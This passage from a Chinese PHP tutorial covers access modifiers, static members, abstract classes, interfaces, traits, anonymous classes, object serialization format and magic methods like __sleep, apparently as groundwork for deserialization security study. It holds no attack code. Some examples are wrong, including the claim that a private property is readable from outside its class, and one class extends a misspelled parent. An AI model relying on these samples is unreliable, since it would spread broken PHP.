&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>color</code>属性可以被子类继承并访问</p>
<h5 id="private权限"><a href="#private权限" class="headerlink" title="private权限"></a>private权限</h5><p>私有属性,只能在类自身中访问,其他位置不能访问,包括继承它的类</p>
<p>🌰</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Animal</span></span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">private</span> <span class="variable">$color</span>;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">eat</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">sleep</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Human</span> <span class="keyword">extends</span> <span class="title">Animals</span></span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$gender</span>;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">think</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">  </span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//正确，类实例可以访问到自身的私有属性</span></span><br><span class="line"><span class="variable">$animal</span> = <span class="keyword">new</span> <span class="title class_">Animal</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$animal</span> -&gt;color;</span><br><span class="line"><span class="comment">//错误,子类实例不能访问父类私有属性</span></span><br><span class="line"><span class="variable">$human</span> = <span class="keyword">new</span> <span class="title class_">Human</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$human</span> -&gt;color;</span><br><span class="line"><span class="comment">//错误,子类实例调用不了父类的私有方法</span></span><br><span class="line"><span class="variable">$human</span>-&gt;<span class="title function_ invoke__">sleep</span>();</span><br></pre></td></tr></table></figure>

<h4 id="类的属性"><a href="#类的属性" class="headerlink" title="类的属性"></a>类的属性</h4><p>属性声明是由关键字public、protected或者private开头，然后跟一个普通的变量声明来组成。属性中的变量可以初始化，但初始化的值必须是常数，这里的常数是指PHP脚本在编译阶段时就可以得到其值，而不依赖于运行时的信息才能求值。</p>
<p>🌰</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Animal</span></span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$name</span>=<span class="string">&quot;panda&quot;</span>; <span class="comment">#初始化</span></span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">eat</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">sleep</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h5 id="静态属性"><a href="#静态属性" class="headerlink" title="静态属性"></a>静态属性</h5><p>指不用实例化类对象，直接通过类名访问的属性或者方法</p>
<p>声明类属性或方法为静态，就可以不实例化类而直接访问。静态属性不能通过一个类已实例化的对象来访问(但静态方法可以)</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Animal</span></span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="built_in">static</span> <span class="variable">$color</span>;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">eat</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="comment">//这里直接通过类名调用，不需要实例化</span></span><br><span class="line">    <span class="title class_">Animal</span>::<span class="title function_ invoke__">sleep</span>();</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">private</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">sleep</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">self</span>::<span class="variable">$color</span>;</span><br><span class="line">    <span class="comment">//使用双冒号指向静态属性</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Human</span> <span class="keyword">extends</span> <span class="title">Animal</span></span>&#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$gender</span>;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">think</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">parent</span>::<span class="variable">$color</span>;</span><br><span class="line">    <span class="comment">//子类也可以直接访问到父类的静态方法</span></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h5 id="final属性"><a href="#final属性" class="headerlink" title="final属性"></a>final属性</h5><p>如果代码中有<code>final</code>关键字就不允许子类重写父类,如果子类强制重写父类就会报错</p>
<h4 id="类的分类"><a href="#类的分类" class="headerlink" title="类的分类"></a>类的分类</h4><p>前面我们定义类的时候,没有修饰,类也是可以有不同的修饰符号的</p>
<h5 id="抽象类"><a href="#抽象类" class="headerlink" title="抽象类"></a>抽象类</h5><p>使用<code>abstract</code>关键字定义抽象类</p>
<p>定义为抽象的类不能被实例化.任何一个类,如果它里面至少有一个方法是被声明为抽象的,那么这个类就必须被声明为抽象的.被定义为抽象的方法只是声明了其调用方式(参数),不能定义其具体的功能实现.</p>
<p>继承一个抽象类的时候,子类必须定义父类中的所有抽象方法;另外,这些方法的访问控制必须和父类中的一样(或者更为宽松).例如某个抽象方法被声明为受保护 的,那么子类中实现的方法就应该声明为受保护的或者公有的,而不能被定义为私有的.此外方法的调用方式必须匹配,即类型和所需参数数量必须一致.例如,子类定义了一个可选参数,而父类抽象方法的声明里没有,则两者的声明并无冲突.</p>
<p>🌰</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">Animal</span></span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">abstract</span> <span class="function"><span class="keyword">function</span> <span class="title">sleep</span>(<span class="params"></span>)</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Human</span> <span class="keyword">extends</span> <span class="title">Animal</span></span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">sleep</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;in bed&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Bird</span> <span class="keyword">extends</span> <span class="title">Animal</span></span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">sleep</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;on tree&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">Human</span>();</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$a</span>);</span><br></pre></td></tr></table></figure>

<p>抽象类的作用是保证他的子类都有指定的共同方法,方便外部调用,而不关心内部的具体实现</p>
<p>总之:</p>
<ul>
<li>抽象类不能实例化,只能实例化子类</li>
<li>抽象类可以有具体方法,但至少应该有一个抽象方法</li>
<li>继承抽象类的子类必须实现抽象类的所有抽象方法</li>
</ul>
<h5 id="接口"><a href="#接口" class="headerlink" title="接口"></a>接口</h5><p>使用<code>interface</code>来定义,很像抽象类</p>
<p>使用接口(interface),可以指定某个类必须实现哪些方法,但不需要定义这些方法的具体内容.其中定义的所有的方法都是空的</p>
<p>接口中定义的所有方法都必须是公有的,这是接口的特性</p>
<p>要实现一个接口,使用<code>implements</code>操作符.类中必须实现接口中定义的所有方法,否则会报一个致命错误.类可以实现多个接口,用逗号来分隔多个接口的名称.</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">interface</span> <span class="title">a</span> </span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">foo</span>(<span class="params"></span>)</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">interface</span> <span class="title">b</span> </span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">bar</span>(<span class="params"></span>)</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">interface</span> <span class="title">c</span> <span class="keyword">extends</span> <span class="title">a</span> ,<span class="title">b</span> </span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">baz</span>(<span class="params"></span>)</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">d</span> <span class="keyword">implements</span> <span class="title">c</span> </span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">foo</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">bar</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">public</span>  <span class="function"><span class="keyword">function</span> <span class="title">baz</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>接口允许继承,实现接口,也允许实现多个接口</p>
<h5 id="trait"><a href="#trait" class="headerlink" title="trait"></a>trait</h5><p>PHP5.4起,PHP实现了一种代码复用的方法,为trait</p>
<p>Trait 是为类似php单继承语言而备用的一种代码复用机制.Trait 为了减少单继承语言的限制,使开发人员能够自由地在不同层次结构内独立的类中复用method. Trait 和 class组合的语义定义了一种减少复杂性的方式,避免传统多继承和Mixin类相关典型问题.</p>
<p>Trait 和 Class 相似,但仅仅旨在用细粒度和一致的方式来组合功能. 无法通过Trait 自身来实例化. 它为传统继承增加了水平特性的组合; 也就是说应用的几个Class之间不需要继承.</p>
<p>trait 是可以组合的,由多个trait构成一个新的trait</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="class"><span class="keyword">trait</span> <span class="title">Hello</span> </span>&#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">SayHello</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;hello&#x27;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">trait</span> <span class="title">World</span> </span>&#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">SayWorld</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">     <span class="keyword">echo</span> <span class="string">&#x27;world&#x27;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">trait</span> <span class="title">HelloWorld</span></span>&#123;</span><br><span class="line">  <span class="keyword">use</span> <span class="title">Hello</span>, <span class="title">World</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyHelloWorld</span> </span>&#123;</span><br><span class="line">  <span class="keyword">use</span> <span class="title">HelloWorld</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$o</span> = <span class="keyword">new</span> <span class="title class_">MyHelloWorld</span>();</span><br><span class="line"><span class="variable">$o</span> -&gt; <span class="title function_ invoke__">SayHello</span>();</span><br><span class="line"><span class="variable">$o</span> -&gt; <span class="title function_ invoke__">SayWorld</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>trait配合接口或者抽象类</p>
<h5 id="匿名类"><a href="#匿名类" class="headerlink" title="匿名类"></a>匿名类</h5><p>匿名类是为了解决临时实现某个抽象类或者接口类实例用的</p>
<p>匿名类我们关注的点是临时执行下我们自定义的run方法,这个类其他地方也用不到,所以我们不需要给它专门起名定义,占用代码行数,反正Command类的run方法关心的是传入的对象有没有run方法,而不关心传入的对象叫什么名字. </p>
<p>🌰</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Command</span> </span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">run</span> (<span class="params"><span class="variable">$var</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$var</span> -&gt; <span class="title function_ invoke__">run</span>();</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$command</span> = <span class="keyword">new</span> <span class="title class_">Command</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$command</span>-&gt;<span class="title function_ invoke__">run</span> (<span class="keyword">new</span> <span class="keyword">class</span>&#123;</span><br><span class="line">  function <span class="title function_ invoke__">run</span>()&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;临时用的所以不起名字&quot;</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;); </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h4 id="对象序列化"><a href="#对象序列化" class="headerlink" title="对象序列化"></a>对象序列化</h4><p>所有PHP里面的值都可以使用函数<code>serialize()</code>来返回一个包含字节流的字符串来表示.<code>unserialize()</code>函数能够重新把字符串变回PHP原来的值. 序列化一个对象将会保存对象的所有变量,但不会保存对象的方法,只会保存类的名字.</p>
<p>对象序列化 <code>serialize</code>方法,返回字符串,此字符串包含了表示value的字节流,可以存储于任何地方,有利于存储或传递PHP的值,同时不丢失其类型和结构.</p>
<p>对象反序列化 <code>unserialize</code>方法,对单一的已序列化的变量进行操作,将其转换回PHP值.</p>
<ul>
<li><input checked="" disabled="" type="checkbox"> 字符串和数字都可以序列化/反序列化</li>
</ul>
<h2 id="第二节-php的序列化与反序列化"><a href="#第二节-php的序列化与反序列化" class="headerlink" title="第二节 php的序列化与反序列化"></a>第二节 php的序列化与反序列化</h2><h3 id="0x3-序列化与反序列化"><a href="#0x3-序列化与反序列化" class="headerlink" title="0x3 序列化与反序列化"></a>0x3 序列化与反序列化</h3><h4 id="序列化"><a href="#序列化" class="headerlink" title="序列化"></a>序列化</h4><p>序列化的本质是将内存中的对象,转换为可以保存,传输的字符</p>
<p>在php中,我们不仅可以序列化对象的实例,也可以序列化一些基本类型</p>
<p>🌰</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$name</span> = <span class="string">&quot;charmersix&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$name</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>可以得到序列化字符串</p>
<p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202210031520075.png" alt="image-20221002180711339"></p>
<p>其中第一个s表示被序列化的对象类型,s指string</p>
<p>后面紧跟一个冒号和数字,表示属性的长度,后面冒号+双引号表示属性的内容</p>
<p>我们也可以尝试序列化一个我们自定义的类</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Animal</span></span>&#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">eat</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;i can eat&quot;</span>;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">sleep</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;i can sleep&quot;</span>;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">Animal</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span> (<span class="variable">$a</span>);</span><br></pre></td></tr></table></figure>

<p>可以看到一个对象被序列化以后的字符串</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">O:<span class="number">6</span>:<span class="string">&quot;Animal&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;name&quot;</span>;N;&#125;</span><br></pre></td></tr></table></figure>

<p>一个对象，名字是6个字符，内容是Animal，有一个属性，是个字符串，名字由4个字符组成，是name，没有值，是Null</p>
<p>属性是有权限的，当属性权限为<code>protected</code>时,可以看到序列化结果为:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">O:<span class="number">6</span>:<span class="string">&quot;Animal&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">7</span>:<span class="string">&quot;*name&quot;</span>;N;&#125;</span><br><span class="line">O%<span class="number">3</span>A6%<span class="number">3</span>A%<span class="number">22</span>Animal%<span class="number">22</span>%<span class="number">3</span>A1%<span class="number">3</span>A%<span class="number">7</span>Bs%<span class="number">3</span>A7%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span>%<span class="number">2</span>A%<span class="number">00</span>name%<span class="number">22</span>%<span class="number">3</span>BN%<span class="number">3</span>B%<span class="number">7</span>D</span><br></pre></td></tr></table></figure>

<p>属性名字前加了*表示这个属性是<code>protected</code>权限,其实这里还有不可见字符,可以看到长度是7</p>
<p>那么增加的不可见字符是什么呢,就是<code>\x00*\x00</code>,三个字符加上name的4个字符,刚好是7字符,可以通过<code>urlencode</code>发现不可见字符,所以遇到非public属性进行序列化时,一定不要直接复制输出,除非进行了<code>urlencode</code>编码</p>
<p>如果是私有属性反序列化后是类名+属性</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">O:<span class="number">6</span>:<span class="string">&quot;Animal&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">12</span>:<span class="string">&quot;Animalname&quot;</span>;N;&#125;</span><br><span class="line">O%<span class="number">3</span>A6%<span class="number">3</span>A%<span class="number">22</span>Animal%<span class="number">22</span>%<span class="number">3</span>A1%<span class="number">3</span>A%<span class="number">7</span>Bs%<span class="number">3</span>A12%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span>Animal%<span class="number">00</span>name%<span class="number">22</span>%<span class="number">3</span>BN%<span class="number">3</span>B%<span class="number">7</span>D</span><br></pre></td></tr></table></figure>

<p>可以看到我们虽然序列化的是子类,但是会把父类的私有属性也序列化进去,甚至可以吧<code>trait</code>看成一种特殊的继承类,也会被序列化进去</p>
<p>抽象类和接口都无法序列化,但是匿名类可以序列化</p>
<p>对象的属性也可以为对象</p>
<p>🌰</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">trait</span> <span class="title">action</span></span>&#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$move</span> = <span class="string">&quot;step&quot;</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Animal</span></span>&#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">eat</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;i can eat&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">sleep</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;i can sleep&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Human</span> <span class="keyword">extends</span> <span class="title">Animal</span></span>&#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$gender</span>;</span><br><span class="line">  <span class="keyword">use</span> <span class="title">action</span>;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">think</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">Animal</span>();</span><br><span class="line"></span><br><span class="line"><span class="variable">$h</span> = <span class="keyword">new</span> <span class="title class_">Human</span>();</span><br><span class="line"><span class="variable">$a</span> -&gt; <span class="keyword">new</span> = <span class="variable">$h</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span> (<span class="variable">$a</span>);</span><br></pre></td></tr></table></figure>

<p>这时候，序列化后的字符串为</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">O:<span class="number">6</span>:<span class="string">&quot;Animal&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;name&quot;</span>;N;s:<span class="number">3</span>:<span class="string">&quot;new&quot;</span>;O:<span class="number">5</span>:<span class="string">&quot;Human&quot;</span>:<span class="number">3</span>:&#123;s:<span class="number">6</span>:<span class="string">&quot;gender&quot;</span>;N;s:<span class="number">4</span>:<span class="string">&quot;name&quot;</span>;N;s:<span class="number">4</span>:<span class="string">&quot;move&quot;</span>;s:<span class="number">4</span>:<span class="string">&quot;step&quot;</span>;&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>一个对象,名字是6个字符,内容是Animal,有1个属性,属性名字是字符串,长度为4,内容name,值是一个对象,对象名字是5个字符,内容是Human,包含三个属性,分别是6个字符的gender,4个字符的name,以及4个字符的move</p>
<p>总结:</p>
<p>序列化就是对一个对象的所有属性,用字符串描述出来,方便反序列化时还原</p>
<h4 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h4><p>反序列化是对已经序列化后的字符串,重新构造出一个对象使用<code>unserialize</code></p>
<p>🌰</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Animal</span></span>&#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$name</span> = <span class="string">&quot;panda&quot;</span>;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">eat</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;i can eat&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">sleep</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;i can sleep&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">Animal</span>();</span><br><span class="line"><span class="comment">//echo serialize ($a);</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//得到序列化以后的结果</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$p</span> = <span class="string">&#x27;O:6:&quot;Animal&quot;:1:&#123;s:4:&quot;name&quot;;s:5:&quot;panda&quot;;&#125;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$panda</span> = <span class="title function_ invoke__">unserialize</span> (<span class="variable">$p</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$panda</span> -&gt;name;</span><br></pre></td></tr></table></figure>

<p>可以看到输出了一个<code>panda</code></p>
<p>php对于不识别的类被反序列化后,会给自动分配一个类名,这个类名就是<code>__PHP_Incomplete_Class</code></p>
<p>总结:</p>
<ol>
<li>反序列化时,必须反序列化已经存在的类</li>
<li><code>unserialize</code>函数的参数,必须是字符串</li>
<li><code>unserialize</code>函数返回的是转换之后的值,可为integer、float、string、array、或object，如果传递的字符串不可解序列化，则返回false</li>
</ol>
<p>这里说的存在的类，是指在PHP脚本或所包含的文件中，有class关键字定义的类</p>
<h3 id="0x4-PHP中的魔术方法"><a href="#0x4-PHP中的魔术方法" class="headerlink" title="0x4 PHP中的魔术方法"></a>0x4 PHP中的魔术方法</h3><p>在php中，存在众多的魔法方法，是每个对象默认都有的方法，不管定义不定义，都会存在</p>
<p>首先总结一下干货, 方便食用</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">__construct：在创建对象时候初始化对象，一般用于对变量赋初值。</span><br><span class="line">__destruct：和构造函数相反，当对象所在函数调用完毕后执行。</span><br><span class="line">__call：当调用对象中不存在的方法会自动调用该方法。</span><br><span class="line"><span class="title function_ invoke__">__get</span>()：获取对象不存在的属性时执行此函数。</span><br><span class="line"><span class="title function_ invoke__">__set</span>()：设置对象不存在的属性时执行此函数。</span><br><span class="line">__toString：当对象被当做一个字符串使用时调用。</span><br><span class="line">__sleep：序列化对象之前就调用此方法(其返回需要一个数组)</span><br><span class="line">__wakeup：反序列化恢复对象之前调用该方法</span><br><span class="line"><span class="title function_ invoke__">__isset</span>()：在不可访问的属性上调用<span class="keyword">isset</span>()或<span class="keyword">empty</span>()触发</span><br><span class="line"><span class="title function_ invoke__">__unset</span>()：在不可访问的属性上使用<span class="keyword">unset</span>()时触发</span><br><span class="line"><span class="title function_ invoke__">__invoke</span>() ：将对象当作函数来使用时执行此方法</span><br></pre></td></tr></table></figure>

<h4 id="sleep和wakeup方法"><a href="#sleep和wakeup方法" class="headerlink" title="sleep和wakeup方法"></a>sleep和wakeup方法</h4><p>魔法方法是以两个下划线开头的方法</p>
<p>其中<code>__sleep</code>方法是序列化的时候，自动调用的方法</p>
<p><code>serialize()</code>函数会检查类中是否存在一个魔术方法<code>__sleep()</code>如果存在,该方法会被调用,然后才执行序列化操作.此功能可以用于清理对象,并返回一个包含对象中所有应被序列化的变量名称数组.</p>
<p>🌰</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Animal</span></span>&#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$name</span> = <span class="string">&quot;panda&quot;</span>;</span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$color</span> = <span class="string">&quot;red&quot;</span>;</span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$move</span> = <span class="string">&quot;step&quot;</span>;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">eat</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;i can eat&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">sleep</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;i can sleep&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">__sleep</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> [<span class="string">&#x27;name&#x27;</span>,<span class="string">&#x27;color&#x27;</span>];</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">Animal</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span> (<span class="variable">$a</span>);</span><br></pre></td></tr></table></figure>

<p>打印结果为</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">O:<span class="number">6</span>:<span class="string">&quot;Animal&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;name&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;panda&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;color&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;red&quot;</span>;&#125;</span><br><span class="line"><span class="comment">//序列化后只有name和color</span></span><br></pre></td></tr></table></figure>

